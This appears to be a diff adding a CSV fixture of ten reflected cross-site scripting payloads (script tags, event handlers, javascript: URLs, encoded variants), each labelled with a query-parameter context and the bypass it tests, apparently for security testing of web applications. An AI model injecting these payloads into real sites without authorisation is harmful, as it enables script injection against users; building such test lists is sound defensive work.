@@ -1,0 +1,11 @@
+payload_id,payload,context_hint,expected_behavior
+R1,<script>alert(1)</script>,query_param,Simple script execution
+R2,"><script>alert(1)</script>,query_param,Break out of attribute
+R3,';alert(1)//,query_param,JavaScript context break
+R4,<img src=x onerror=alert(1)>,query_param,Image error handler
+R5," onmouseover=alert(1),query_param,Mouse event handler
+R6,javascript:alert(1),query_param,JavaScript protocol
+R7,<svg onload=alert(1)>,query_param,SVG load event
+R8,%3Cscript%3Ealert(1)%3C/script%3E,query_param,URL encoded
+R9,&lt;script&gt;alert(1)&lt;/script&gt;,query_param,HTML entities
+R10,<script>alert(document.domain)</script>,query_param,Domain alert
